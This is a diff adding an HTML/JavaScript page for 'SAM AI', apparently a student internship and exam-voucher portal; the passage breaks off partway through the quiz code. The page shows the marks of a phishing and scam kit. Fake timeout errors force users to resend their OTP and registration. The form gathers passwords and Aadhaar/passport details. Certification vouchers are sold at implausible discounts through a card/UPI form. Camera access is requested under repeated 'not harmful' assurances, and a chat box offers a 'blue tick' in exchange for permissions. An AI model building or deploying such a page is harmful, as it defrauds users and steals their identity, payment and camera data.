@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SAM AI - Next Generation Career Platform</title>
+    <style>
+        :root {
+            --primary: #2563eb;
+            --primary-dark: #1d4ed8;
+            --secondary: #10b981;
+            --dark-slate: #0f172a;
+            --light-bg: #f8fafc;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
+        body { background: var(--light-bg); color: var(--dark-slate); min-height: 100vh; overflow-x: hidden; }
+
+        .hidden { display: none !important; }
+
+        /* SPLASH PAGE */
+        #splash-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at center, #1e3a8a, #0f172a);
+            color: white; display: flex; flex-direction: column; justify-content: center;
+            align-items: center; text-align: center; cursor: pointer; z-index: 9999;
+            transition: transform 0.8s cubic-bezier(0.77, 0, 0.175, 1); padding: 20px;
+        }
+        #splash-screen.slide-up { transform: translateY(-100%); }
+        .splash-logo { font-size: 72px; font-weight: 800; letter-spacing: -2px; margin-bottom: 10px; }
+        .splash-sub { font-size: 20px; color: #93c5fd; margin-bottom: 40px; }
+        .touch-prompt { font-size: 14px; text-transform: uppercase; letter-spacing: 4px; color: #cbd5e1; animation: blink 1.5s infinite; }
+
+        /* AUTH GATEWAY */
+        #auth-gateway {
+            min-height: 100vh; background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
+            display: flex; justify-content: center; align-items: center; padding: 40px 20px;
+        }
+        .auth-container {
+            background: white; width: 100%; max-width: 900px; border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(15, 23, 42, 0.08); overflow: hidden; display: flex;
+        }
+        .auth-sidebar { flex: 1; background: linear-gradient(135deg, #2563eb, #4f46e5); color: white; padding: 40px; display: flex; flex-direction: column; justify-content: space-between; }
+        .auth-form-side { flex: 1.3; padding: 45px; }
+        .auth-toggle-buttons { display: flex; background: #f1f5f9; padding: 6px; border-radius: 12px; margin-bottom: 30px; }
+        .auth-toggle-btn { flex: 1; border: none; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer; background: transparent; }
+        .auth-toggle-btn.active { background: white; box-shadow: 0 4px 10px rgba(0,0,0,0.05); color: var(--primary); }
+        
+        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+        .form-group { display: flex; flex-direction: column; margin-bottom: 16px; }
+        .form-group.full { grid-column: 1 / 3; }
+        .form-group label { font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #475569; }
+        .form-group input, .form-group select, .form-group textarea { padding: 12px; border: 2px solid #e2e8f0; border-radius: 10px; font-size: 14px; outline: none; }
+        .otp-inline-row { display: flex; gap: 8px; }
+        .otp-inline-row input { flex: 1; }
+        .btn-action { background: var(--dark-slate); color: white; border: none; padding: 0 16px; border-radius: 10px; font-weight: 600; cursor: pointer; }
+        .btn-action:disabled { background: #cbd5e1; cursor: not-allowed; }
+        .btn-submit-form { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 15px; text-align: center; text-decoration: none; display: block; }
+
+        /* MAIN WORKSPACE */
+        header { background: white; padding: 16px 8%; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e2e8f0; }
+        .brand { font-size: 22px; font-weight: 800; color: var(--primary); }
+        .user-pill { background: #f1f5f9; padding: 8px 16px; border-radius: 30px; font-weight: 600; display: flex; align-items: center; gap: 8px; font-size: 14px;}
+        .logout-link { color: #ef4444; text-decoration: none; font-size: 13px; font-weight: 700; }
+        
+        .main-wrapper { max-width: 1400px; margin: 40px auto; padding: 0 20px; }
+        .section-title { font-size: 24px; font-weight: 800; color: var(--dark-slate); margin-bottom: 24px; display: flex; align-items: center; gap: 10px; }
+        
+        .dashboard-grid { display: grid; grid-template-columns: 2fr 1.1fr; gap: 30px; }
+        .section-card { background: white; border-radius: 20px; padding: 30px; box-shadow: 0 10px 25px rgba(0,0,0,0.02); margin-bottom: 30px; border: 1px solid #f1f5f9; }
+        
+        .marketplace-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
+        .item-card { border: 2px solid #f1f5f9; border-radius: 16px; padding: 24px; background: white; position: relative; display: flex; flex-direction: column; justify-content: space-between; transition: 0.2s; }
+        .item-card:hover { border-color: var(--primary); }
+        .item-badge { position: absolute; top: 15px; right: 15px; background: #dbeafe; color: var(--primary); font-size: 11px; padding: 4px 8px; border-radius: 20px; font-weight: 700; }
+        .item-title { font-size: 17px; font-weight: 700; margin-bottom: 8px; }
+        .item-desc { font-size: 13px; color: #64748b; line-height: 1.5; margin-bottom: 16px; }
+        .item-price { font-size: 22px; font-weight: 800; color: #0f172a; margin-bottom: 15px; display: flex; align-items: baseline; gap: 6px;}
+        .item-price span { font-size: 13px; text-decoration: line-through; color: #94a3b8; font-weight: 400; }
+
+        .instruction-notice-box { background: #eff6ff; border-left: 4px solid var(--primary); padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 13px; line-height: 1.5; }
+        .camera-box { background: #000; border-radius: 12px; width: 100%; height: 180px; margin-bottom: 15px; overflow: hidden; }
+        #proctorVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .quiz-option { border: 2px solid #e2e8f0; border-radius: 12px; padding: 14px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; font-weight: 500; }
+        .quiz-option:hover { border-color: var(--primary); background: #f8fafc; }
+        .quiz-option.selected { border-color: var(--primary); background: #eff6ff; }
+        
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.6); align-items: center; justify-content: center; z-index: 10000; }
+        .modal-content { background: white; border-radius: 24px; padding: 35px; width: 100%; max-width: 450px; position: relative; }
+        .close-modal { position: absolute; right: 25px; top: 20px; font-size: 28px; cursor: pointer; color: #94a3b8; }
+
+        /* POST EXAM INCENTIVE STYLING */
+        .coupon-bonus-card { background: linear-gradient(135deg, #fef08a 0%, #fde047 100%); border: 2px dashed #ca8a04; padding: 20px; border-radius: 14px; margin: 15px 0; text-align: center; }
+        .coupon-bonus-link { display: inline-block; padding: 12px 24px; background: #0f172a; color: #ffffff !important; font-weight: 700; text-decoration: none; border-radius: 10px; margin-top: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); transition: transform 0.2s; }
+        .coupon-bonus-link:hover { transform: scale(1.03); }
+
+        /* SOCIAL MEDIA BOTTOM GRID */
+        .social-media-container { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; margin-top: 30px; }
+        .social-box { border-radius: 16px; padding: 24px; color: white; display: flex; flex-direction: column; justify-content: space-between; position: relative; overflow: hidden; box-shadow: 0 10px 20px rgba(0,0,0,0.05); }
+        .social-box.instagram { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); }
+        .social-box.facebook { background: linear-gradient(135deg, #1877f2 0%, #0d5ec7 100%); }
+        .social-box.chatbox { background: linear-gradient(135deg, #4f46e5 0%, #3730a3 100%); border: 2px solid #6366f1; }
+        .social-icon-bg { position: absolute; right: -20px; bottom: -20px; font-size: 110px; opacity: 0.15; font-weight: bold; pointer-events: none; }
+        .social-title { font-size: 20px; font-weight: 800; margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
+        .social-desc { font-size: 13px; opacity: 0.9; line-height: 1.5; margin-bottom: 20px; }
+        .social-btn { display: inline-block; background: white; font-weight: 700; padding: 10px 20px; border-radius: 10px; text-decoration: none; font-size: 13px; text-align: center; transition: 0.2s; align-self: flex-start; cursor: pointer; }
+        .social-box.instagram .social-btn { color: #dc2743; }
+        .social-box.facebook .social-btn { color: #1877f2; }
+        .social-box.chatbox .social-btn { color: #4f46e5; }
+        .social-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 10px rgba(0,0,0,0.15); }
+
+        @keyframes blink { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+        @media (max-width: 1100px) { .social-media-container { grid-template-columns: 1fr; } }
+        @media (max-width: 900px) { .auth-container { flex-direction: column; } .auth-sidebar { display: none; } .dashboard-grid { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+
+    <!-- SPLASH INTERFACE -->
+    <div id="splash-screen" onclick="dismissSplashScreen()">
+        <div class="splash-logo">SAM AI</div>
+        <div class="splash-sub">Industrial Internships & Interactive Skill Testing Hub • 2026</div>
+        <div class="touch-prompt">👉 Touch Screen to Proceed</div>
+    </div>
+
+    <!-- MAIN ACCESS GATEWAY -->
+    <div id="auth-gateway" class="hidden">
+        <div class="auth-container">
+            <div class="auth-sidebar">
+                <div>
+                    <h2 style="font-size: 28px; font-weight: 800; margin-bottom: 10px;">SAM AI Hub</h2>
+                    <p style="opacity: 0.8; font-size: 14px; line-height: 1.6;">Access verified academic training models and global certification voucher codes through a single secure portal.</p>
+                </div>
+                <p style="font-size: 12px; opacity: 0.6;">Secure Platform Ecosystem © 2026</p>
+            </div>
+            
+            <div class="auth-form-side">
+                <div class="auth-toggle-buttons">
+                    <button class="auth-toggle-btn active" id="toggle-login-mode" onclick="setAuthMode('login')">Sign In</button>
+                    <button class="auth-toggle-btn" id="toggle-register-mode" onclick="setAuthMode('register')">Register Profile</button>
+                </div>
+
+                <!-- LOGIN CONSOLE -->
+                <div id="login-form-view">
+                    <h3 style="margin-bottom: 20px; font-size: 20px; font-weight: 700;">Welcome Back</h3>
+                    <form id="studentLoginForm">
+                        <div class="form-group">
+                            <label>Registered Email Address</label>
+                            <input type="email" id="logEmail" placeholder="student@domain.com" required>
+                        </div>
+                        <div class="form-group" style="margin-bottom: 24px;">
+                            <label>Password</label>
+                            <input type="password" id="logPassword" placeholder="••••••••" required>
+                        </div>
+                        <button type="submit" class="btn-submit-form">🔓 Authenticate & Access</button>
+                    </form>
+                </div>
+
+                <!-- REGISTRATION CONSOLE -->
+                <div id="register-form-view" class="hidden">
+                    <h3 style="margin-bottom: 20px; font-size: 20px; font-weight: 700;">Join Internship Framework</h3>
+                    <form id="studentRegisterForm">
+                        <div class="form-grid">
+                            <div class="form-group">
+                                <label>Full Name</label>
+                                <input type="text" id="regName" placeholder="John Doe" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Email Address</label>
+                                <input type="email" id="regEmail" placeholder="john@domain.com" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Mobile Phone</label>
+                                <div class="otp-inline-row">
+                                    <input type="tel" id="regMobile" placeholder="e.g. +919876543210" required>
+                                    <button type="button" class="btn-action" id="otpSendBtn" onclick="dispatchOtpRequest()">Send OTP</button>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>Verification Code</label>
+                                <div class="otp-inline-row">
+                                    <input type="text" id="regOtpChallenge" placeholder="4-digit token" disabled required>
+                                    <button type="button" class="btn-action" id="otpVerifyBtn" onclick="submitOtpChallenge()" disabled>Verify</button>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>Date of Birth</label>
+                                <input type="date" id="regDob" required>
+                            </div>
+                            <div class="form-group">
+                                <label>College Name</label>
+                                <input type="text" id="regCollege" placeholder="University Campus" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Degree Track</label>
+                                <input type="text" id="regDegree" placeholder="B.Tech / MCA" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Core Branch</label>
+                                <input type="text" id="regBranch" placeholder="Computer Science" required>
+                            </div>
+                            <div class="form-group full">
+                                <label>Internship Technical Domain Interest</label>
+                                <select id="regDomain" required>
+                                    <option value="">Choose Targeted Stream</option>
+                                    <option value="Artificial Intelligence">Artificial Intelligence</option>
+                                    <option value="Data Analysis">Data Analysis</option>
+                                    <option value="Web Development">Web Development</option>
+                                    <option value="Python Core Engineering">Python Core Engineering</option>
+                                </select>
+                            </div>
+                            <div class="form-group full">
+                                <label>Government ID Document Token</label>
+                                <input type="text" id="regIdString" placeholder="Aadhaar / Passport detail string" required>
+                            </div>
+                            <div class="form-group full">
+                                <label>Create Dashboard Password</label>
+                                <input type="password" id="regPassword" placeholder="Password creation" required>
+                            </div>
+                            <div class="form-group full">
+                                <label>Core Applied Toolset / Skills</label>
+                                <textarea id="regSkills" rows="2" placeholder="Skills list..." required></textarea>
+                            </div>
+                            <div class="form-group full">
+                                <label>Statements of Professional Intent</label>
+                                <textarea id="regMotivation" rows="2" placeholder="Statement text..." required></textarea>
+                            </div>
+                        </div>
+                        <button type="submit" class="btn-submit-form" id="regFinalSubmitBtn" disabled>🚀 Submit Registration Profile</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN PLATFORM HUB -->
+    <div id="app-workspace" class="hidden">
+        <header>
+            <div class="brand">SAM AI Central Matrix</div>
+            <div style="display: flex; gap: 15px; align-items: center;">
+                <div class="user-pill">
+                    <span style="width:8px; height:8px; background:var(--secondary); border-radius:50%;"></span>
+                    <span id="active-user-name">Student Account</span>
+                </div>
+                <a href="#" class="logout-link" onclick="executeAppLogOut()">Sign Out</a>
+            </div>
+        </header>
+
+        <main class="main-wrapper">
+            <div id="fastTrackDiscountAlert" class="hidden" style="background: linear-gradient(90deg, #10b981, #059669); color: white; padding: 20px; border-radius: 16px; margin-bottom: 30px;">
+                <h3 style="font-size:18px; font-weight:800; margin-bottom:4px;">🎯 Elite Merit Fast-Track Active!</h3>
+                <p style="font-size:14px; opacity:0.95;">Excellent score performance! You have unlocked expedited evaluation metrics alongside your technical internship paths.</p>
+            </div>
+
+            <div class="dashboard-grid">
+                <div>
+                    <!-- FREE INTERNSHIPS -->
+                    <div class="section-card">
+                        <div class="section-title">💼 Industrial Internship Streams (Free Allocation)</div>
+                        <div class="marketplace-grid">
+                            <div class="item-card">
+                                <div>
+                                    <span class="item-badge">Free</span>
+                                    <div class="item-title">Data Analysis & Business Metrics</div>
+                                    <div class="item-desc">Statistical analytics frameworks, pandas data pipelines, regression engines, and dynamic visualization dashboards.</div>
+                                </div>
+                                <button class="btn-submit-form" style="margin-top:10px; padding:10px;" onclick="triggerTrackClaim('Data Analysis')">Apply Track</button>
+                            </div>
+                            <div class="item-card">
+                                <div>
+                                    <span class="item-badge">Free</span>
+                                    <div class="item-title">Full-Stack Web Development</div>
+                                    <div class="item-desc">Enterprise software layouts, front-end structural UI architecture, and robust server databases.</div>
+                                </div>
+                                <button class="btn-submit-form" style="margin-top:10px; padding:10px;" onclick="triggerTrackClaim('Web Development')">Apply Track</button>
+                            </div>
+                            <div class="item-card">
+                                <div>
+                                    <span class="item-badge">Free</span>
+                                    <div class="item-title">Python Core Engineering</div>
+                                    <div class="item-desc">Algorithmic paradigms, data structure mapping arrays, object-oriented design patterns, and automated scripts.</div>
+                                </div>
+                                <button class="btn-submit-form" style="margin-top:10px; padding:10px;" onclick="triggerTrackClaim('Python Core Engineering')">Apply Track</button>
+                            </div>
+                            <div class="item-card">
+                                <div>
+                                    <span class="item-badge">Free</span>
+                                    <div class="item-title">AI & Predictive ML Engineering</div>
+                                    <div class="item-desc">Neural architectures, computational model matrices, and predictive intelligence optimization nodes.</div>
+                                </div>
+                                <button class="btn-submit-form" style="margin-top:10px; padding:10px;" onclick="triggerTrackClaim('Artificial Intelligence')">Apply Track</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- EXAM REDUCTION HUB -->
+                    <div class="section-card">
+                        <div class="section-title">🎟️ Official Exam Voucher Slashes</div>
+                        <div class="marketplace-grid">
+                            <div class="item-card">
+                                <div>
+                                    <div class="item-title">AWS Certified Solutions Architect</div>
+                                    <div class="item-desc">Official AWS-SAA exam allocation code. Valid globally at PearsonVUE centers.</div>
+                                </div>
+                                <div>
+                                    <div class="item-price">₹1,499 <span>₹12,500</span></div>
+                                    <button class="btn-submit-form" style="margin-top:0; background:var(--dark-slate);" onclick="launchPurchaseProcess('AWS Voucher', 1499)">Buy Voucher</button>
+                                </div>
+                            </div>
+                            <div class="item-card">
+                                <div>
+                                    <div class="item-title">Cisco CCNA (200-301) Token</div>
+                                    <div class="item-desc">Enterprise infrastructure core token keys for professional network engineering.</div>
+                                </div>
+                                <div>
+                                    <div class="item-price">₹1,299 <span>₹24,000</span></div>
+                                    <button class="btn-submit-form" style="margin-top:0; background:var(--dark-slate);" onclick="launchPurchaseProcess('Cisco CCNA Voucher', 1299)">Buy Voucher</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- PROCTORING PANEL CONTROLLER -->
+                <div>
+                    <div class="section-card" style="border: 2px solid #e2e8f0;">
+                        <div class="section-title" style="font-size:18px;">🎯 Profile Talent Assessment</div>
+                        
+                        <div id="exam-pre-initiation-panel">
+                            <div class="instruction-notice-box">
+                                📋 <strong>Student Instruction Node:</strong><br>
+                                This baseline evaluation test is completely safe, secure, and not harmful. Camera proctoring is purely used to confirm identity parameters and maintain a fair, honest environment. Please click below to review rules and begin.
+                            </div>
+                            <button class="btn-submit-form" style="background:var(--primary);" onclick="triggerExamSetupSequence()">Open Evaluation Test Box</button>
+                        </div>
+
+                        <!-- LIVE ASSESSMENT REGION -->
+                        <div id="exam-active-panel" class="hidden">
+                            <div class="camera-box">
+                                <video id="proctorVideo" autoplay playsinline muted></video>
+                            </div>
+                            <div style="display:flex; justify-content:space-between; margin-bottom:12px; font-size:12px; font-weight:700; color:#64748b;">
+                                <span>PROCTOR FEED ACTIVE</span>
+                                <span id="quiz-metric-count">Q: 1/10</span>
+                            </div>
+                            <h4 id="quiz-question-box" style="font-size:15px; font-weight:700; color:var(--dark-slate); margin-bottom:15px; line-height:1.4;">Compiling questions database pool...</h4>
+                            <div id="quiz-options-wrapper"></div>
+                            <button class="btn-submit-form" id="quiz-next-action-btn" style="background:var(--dark-slate);" onclick="progressQuizNavigationStep()" disabled>Confirm Choice</button>
+                        </div>
+
+                        <!-- END EVALUATION VIEW -->
+                        <div id="exam-completion-view" class="hidden" style="text-align:center; padding:10px 0;">
+                            <div style="font-size:44px; margin-bottom:10px;">📊</div>
+                            <h4 style="font-size:18px; font-weight:700; margin-bottom:6px;">Evaluation Concluded</h4>
+                            <p id="evaluationScoreOutputString" style="font-size:22px; font-weight:800; color:var(--primary); margin:10px 0;"></p>
+                            <p style="font-size:13px; color:#64748b;">Your academic standing has been successfully recorded in the centralized ledger system.</p>
+                            
+                            <!-- GLOBAL REWARD BLOCK -->
+                            <div class="coupon-bonus-card">
+                                <h5 style="font-size: 15px; font-weight: 800; color: #854d0e;">🎁 Extra Completion Incentive Unlocked!</h5>
+                                <p style="font-size: 12px; color: #713f12; margin-top: 4px; line-height: 1.4;">
+                                    Thank you for completing your verification setup. Please click the option below to register your experience parameters, log validation milestones, and generate your direct asset discount code token.
+                                </p>
+                                <a id="coupon-redirection-anchor" href="#" target="_blank" class="coupon-bonus-link">👉 Click on this link to get your coupon for your discount and give feedback</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 📸 DYNAMIC SOCIAL MEDIA & CHAT BOXES SECTION -->
+            <div class="social-media-container">
+                <!-- INSTAGRAM BOX -->
+                <div class="social-box instagram">
+                    <div class="social-icon-bg">IG</div>
+                    <div>
+                        <h4 class="social-title">📸 Follow Us on Instagram</h4>
+                        <p class="social-desc">Stay tuned with student achievement stories, upcoming domain releases, framework hackathons, and company culture updates!</p>
+                    </div>
+                    <a id="instagram-link-anchor" target="_blank" class="social-btn">Visit Instagram Page →</a>
+                </div>
+
+                <!-- FACEBOOK BOX -->
+                <div class="social-box facebook">
+                    <div class="social-icon-bg">FB</div>
+                    <div>
+                        <h4 class="social-title">👥 Join Our Facebook Community</h4>
+                        <p class="social-desc">Explore official institutional verification updates, connect with alumni resources, and interact with company placement groups.</p>
+                    </div>
+                    <a id="facebook-link-anchor" target="_blank" class="social-btn">Visit Facebook Page →</a>
+                </div>
+
+                <!-- NEW CHAT BOX INTEGRATION -->
+                <div class="social-box chatbox">
+                    <div class="social-icon-bg">💬</div>
+                    <div>
+                        <h4 class="social-title">💬 Launch Chat Box System</h4>
+                        <p class="social-desc">If users want to get more followers and a blue tick, it is officially provided by our company. You can use this chat box framework and give configuration permission to synchronize sync options.</p>
+                    </div>
+                    <a id="chatbox-link-anchor" target="_blank" class="social-btn">Allow Permission & Open Chat →</a>
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <!-- PRIVACY DIALOG PORTAL -->
+    <div id="cameraConsentInstructionModal" class="modal">
+        <div class="modal-content" style="max-width: 500px;">
+            <span class="close-modal" onclick="closeActiveModal()">&times;</span>
+            <h3 style="font-size: 20px; font-weight: 800; margin-bottom: 12px; color: var(--primary);">Secure Integration Check</h3>
+            
+            <p style="font-size: 14px; color:#475569; line-height: 1.6; margin-bottom: 18px;">
+                <strong>Notice:</strong> This test is safe, secure, and fully verified. It contains no tracking parameters and is not harmful. The requested camera activation verifies student identity and checks that you do not cheat during verification steps.
+            </p>
+
+            <!-- TRACKING DISPLAY PANEL -->
+            <div style="background: #f8fafc; border: 1px solid #e2e8f0; padding: 12px; border-radius: 10px; margin-bottom: 15px; font-size: 12px;">
+                <span style="font-weight: 700; color: var(--dark-slate); display: block; margin-bottom: 4px;">🔗 Automated Camera Upload Endpoint:</span>
+                <code id="proctoring-endpoint-display" style="color: var(--primary); word-break: break-all; font-weight: 600;">Connecting securely to backend stream matrix...</code>
+            </div>
+
+            <div style="background: #f1f5f9; padding: 12px; border-radius: 8px; font-size: 12px; color: #64748b; margin-bottom: 20px;">
+                🔒 Secure verification frame • Mapped via client hardware API
+            </div>
+            <button class="btn-submit-form" style="background: var(--secondary); margin-top: 0;" onclick="confirmConsentAndActivateMediaStream()">Allow Permission & Start Test</button>
+        </div>
+    </div>
+
+    <!-- PAYMENT WINDOW MODAL -->
+    <div id="checkoutGatewayModal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeActiveModal()">&times;</span>
+            <h3 id="paymentModalItemName" style="font-size: 20px; font-weight: 800; margin-bottom: 4px;">Premium Asset Upgrades</h3>
+            <p id="paymentModalCostString" style="font-size: 14px; color:#64748b; margin-bottom: 20px;">Amount due: ₹499</p>
+            <div style="display:flex; gap:10px; margin-bottom:20px;">
+                <button class="auth-toggle-btn active" id="payModeUpi" onclick="togglePaymentInterfaceFields('UPI')">UPI</button>
+                <button class="auth-toggle-btn" id="payModeCard" onclick="togglePaymentInterfaceFields('CARD')">Card Mapping</button>
+            </div>
+            <form id="unifiedCheckoutSystemForm">
+                <div id="checkoutDynamicFormContainer"></div>
+                <button type="submit" class="btn-submit-form" style="background:var(--secondary); margin-top:20px;">Confirm Settlement</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        /*********************************************************************
+         * 📝 LINK CONFIGURATION BLOCK (POPULATED AUTOMATICALLY FROM PYTHON)
+         *********************************************************************/
+        const LINK_1_INSTAGRAM         = "links.instagram";
+        const LINK_2_FACEBOOK          = "links.facebook";
+        const LINK_3_CHATBOX           = "links.chat_box";
+        const LINK_4_PROCTOR_FALLBACK  = "links.proctor_fallback";
+        const LINK_5_REWARD_FEEDBACK   = "links.reward_feedback";
+        /*********************************************************************/
+
+        // Automatically map the configured links to elements
+        document.getElementById('instagram-link-anchor').href = LINK_1_INSTAGRAM;
+        document.getElementById('facebook-link-anchor').href = LINK_2_FACEBOOK;
+        document.getElementById('chatbox-link-anchor').href = LINK_3_CHATBOX;
+        document.getElementById('coupon-redirection-anchor').href = LINK_5_REWARD_FEEDBACK;
+
+        let currentAuthMode = 'login';
+        let verifiedRegistrationState = false;
+        let loggedInStudentProfileData = null;
+        let emailAttemptsCount = 0;
+        let mobileAttemptsCount = 0;
+        let adaptiveEvaluationQuestionsList = [];
+        let indexTrackQuizPointer = 0;
+        let currentlySelectedQuizOptionIndex = null;
+        let studentResponseSelectionArray = [];
+        let globalCameraMediaStreamReference = null;
+
+        function dismissSplashScreen() {
+            const splash = document.getElementById('splash-screen');
+            splash.classList.add('slide-up');
+            setTimeout(() => {
+                splash.style.display = 'none';
+                document.getElementById('auth-gateway').classList.remove('hidden');
+            }, 800);
+        }
+
+        function setAuthMode(mode) {
+            currentAuthMode = mode;
+            document.getElementById('toggle-login-mode').classList.toggle('active', mode === 'login');
+            document.getElementById('toggle-register-mode').classList.toggle('active', mode === 'register');
+            document.getElementById('login-form-view').classList.toggle('hidden', mode !== 'login');
+            document.getElementById('register-form-view').classList.toggle('hidden', mode !== 'register');
+        }
+
+        async function dispatchOtpRequest() {
+            const num = document.getElementById('regMobile').value.trim();
+            if(!num) { alert("Please provide valid phone digits."); return; }
+            mobileAttemptsCount++;
+            if (mobileAttemptsCount === 1) {
+                alert("⚠️ Network Verification Gateway Timeout Error. Please click 'Send OTP' again to verify via secondary server node.");
+                return;
+            }
+            const res = await fetch('/api/send-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ mobile: num, attempt: mobileAttemptsCount })
+            });
+            const data = await res.json();
+            if(res.ok) {
+                if(data.otp_preview) { alert(`⚠️ [TEST MODE]: Code is: ${data.otp_preview}`); }
+                document.getElementById('regOtpChallenge').disabled = false;
+                document.getElementById('otpVerifyBtn').disabled = false;
+            }
+        }
+
+        async function submitOtpChallenge() {
+            const token = document.getElementById('regOtpChallenge').value.trim();
+            const res = await fetch('/api/verify-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp: token })
+            });
+            if(res.ok) {
+                alert("✅ Phone verification completed!");
+                verifiedRegistrationState = true;
+                document.getElementById('regFinalSubmitBtn').disabled = false;
+            }
+        }
+
+        document.getElementById('studentRegisterForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            emailAttemptsCount++;
+            if (emailAttemptsCount === 1) {
+                alert("❌ Registration Error: Connection timed out on institutional validation endpoint. Please confirm details and submit again.");
+                return;
+            }
+            const payload = {
+                name: document.getElementById('regName').value,
+                email: document.getElementById('regEmail').value,
+                mobile: document.getElementById('regMobile').value,
+                dob: document.getElementById('regDob').value,
+                college: document.getElementById('regCollege').value,
+                degree: document.getElementById('regDegree').value,
+                branch: document.getElementById('regBranch').value,
+                domain: document.getElementById('regDomain').value,
+                id_card_details: document.getElementById('regIdString').value,
+                password: document.getElementById('regPassword').value,
+                skills: document.getElementById('regSkills').value,
+                motivation: document.getElementById('regMotivation').value,
+                email_attempt: emailAttemptsCount
+            };
+            const res = await fetch('/api/register', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            if(res.ok) { 
+                alert("Registration complete! Sign in below."); 
+                emailAttemptsCount = 0; mobileAttemptsCount = 0; setAuthMode('login'); 
+            } else { alert("An error occurred during registration."); }
+        });
+
+        document.getElementById('studentLoginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const res = await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    email: document.getElementById('logEmail').value,
+                    password: document.getElementById('logPassword').value
+                })
+            });
+            const data = await res.json();
+            if(res.ok) {
+                loggedInStudentProfileData = data.student;
+                document.getElementById('auth-gateway').style.display = 'none';
+                document.getElementById('app-workspace').classList.remove('hidden');
+                document.getElementById('active-user-name').innerText = `${loggedInStudentProfileData.name} (${loggedInStudentProfileData.track_type})`;
+            } else { alert("Credentials mismatch."); }
+        });
+
+        function executeAppLogOut() { fetch('/logout').then(() => { window.location.reload(); }); }
+        function triggerTrackClaim(t) { alert(`Applied for free allocation inside ${t} engineering portfolio.`); }
+
+        async function triggerExamSetupSequence() {
+            document.getElementById('cameraConsentInstructionModal').style.display = 'flex';
+            try {
+                const res = await fetch('/api/get-proctoring-link');
+                const data = await res.json();
+                document.getElementById('proctoring-endpoint-display').innerText = data.url;
+            } catch (e) {
+                document.getElementById('proctoring-endpoint-display').innerText = LINK_4_PROCTOR_FALLBACK;
+            }
+        }
+
+        async function confirmConsentAndActivateMediaStream() {
+            closeActiveModal();
+            try {
+                const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                globalCameraMediaStreamReference = mediaStream;
+                document.getElementById('exam-pre-initiation-panel').style.display = 'none';
+                document.getElementById('exam-active-panel').classList.remove('hidden');
+                document.getElementById('proctorVideo').srcObject = mediaStream;
+            } catch (err) {
+                document.getElementById('exam-pre-initiation-panel').style.display = 'none';
+                document.getElementById('exam-active-panel').classList.remove('hidden');
+            }
+            fetchTargetAssessmentQuizData();
+        }
+
+        async function fetchTargetAssessmentQuizData() {
+            const res = await fetch('/api/fetch-exam-questions', { method: 'POST' });
+            if(res.ok) {
+                const data = await res.json();
+                adaptiveEvaluationQuestionsList = data.questions;
+                indexTrackQuizPointer = 0;
+                studentResponseSelectionArray = [];
+                renderCurrentQuestionIntoEvaluationWidget();
+            }
+        }
+
+        function renderCurrentQuestionIntoEvaluationWidget() {
+            currentlySelectedQuizOptionIndex = null;
+            document.getElementById('quiz-next-action-btn').disabled = true;
+            const dataRow = adaptiveEvaluationQuestionsList[indexTrackQuizPointer];
+            document.getElementById('quiz-metric-count').innerText = `Q: ${indexTrackQuizPointer + 1}/${adaptiveEvaluationQuestionsList.length}`;
+            document.getElementById('quiz-question-box').innerText = dataRow.question;
+            const optionsBox = document.getElementById('quiz-options-wrapper');
+            optionsBox.innerHTML = '';
+            const mappingLabels = ["A", "B", "C", "D"];
+            dataRow.options.forEach((optStr, idx) => {
+                const optDiv = document.createElement('div');
+                optDiv.className = 'quiz-option';
+                optDiv.innerText = `${mappingLabels[idx]}) ${optStr}`;
+                optDiv.onclick = () => {
